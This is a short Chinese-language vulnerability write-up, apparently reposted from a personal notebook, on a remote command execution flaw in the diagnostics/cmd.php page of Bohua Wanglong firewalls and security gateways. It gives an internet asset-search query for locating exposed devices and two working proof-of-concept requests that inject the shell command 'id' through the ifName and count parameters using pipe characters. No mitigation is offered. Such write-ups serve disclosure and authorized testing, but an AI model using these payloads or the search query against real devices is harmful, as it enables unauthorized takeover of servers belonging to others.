# 博华网龙安全设备cmd.php远程命令执行漏洞

# 一、漏洞简介
中科博华是一家集科研、产品开发、技术服务、系统集成为一体的高科技企业，是国家商用密码产品定点生产单位，具有商用密码生产和销售许可证、3C认证、系统集成叁级资质、信息安全服务一级资质和涉密资质等。中科博华多个安全设备系统存在远程代码执行漏洞，攻击者通过漏洞可以获取服务器权限。

# 二、影响版本
+ 博华网龙防火墙
+ 博华网龙信息安全一体机
+ 博华网龙安全网关

# 三、资产测绘
+ hunter`web.title="博华网龙"`
+ 特征

![1696566856436-c5c98016-9190-4ff0-a67e-becd89d83102.png](./img/Yaw0bhzWq8eQpP9I/1696566856436-c5c98016-9190-4ff0-a67e-becd89d83102-746962.png)

# 四、漏洞复现
**poc1:**

```plain
/diagnostics/cmd.php?action=arping&ifName=|id||
```

![1696566921516-95ed8ce9-77e0-4146-bdc6-63c346ac5baf.png](./img/Yaw0bhzWq8eQpP9I/1696566921516-95ed8ce9-77e0-4146-bdc6-63c346ac5baf-114102.png)

**poc2:**

```plain
/diagnostics/cmd.php?action=ping&count=||id||
```

![1696566937647-b84f3c0a-7dc7-48e4-a1c4-c3c3b87510cc.png](./img/Yaw0bhzWq8eQpP9I/1696566937647-b84f3c0a-7dc7-48e4-a1c4-c3c3b87510cc-081162.png)



> 更新: 2024-02-29 23:57:14  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ognnq9azp0fodi9b>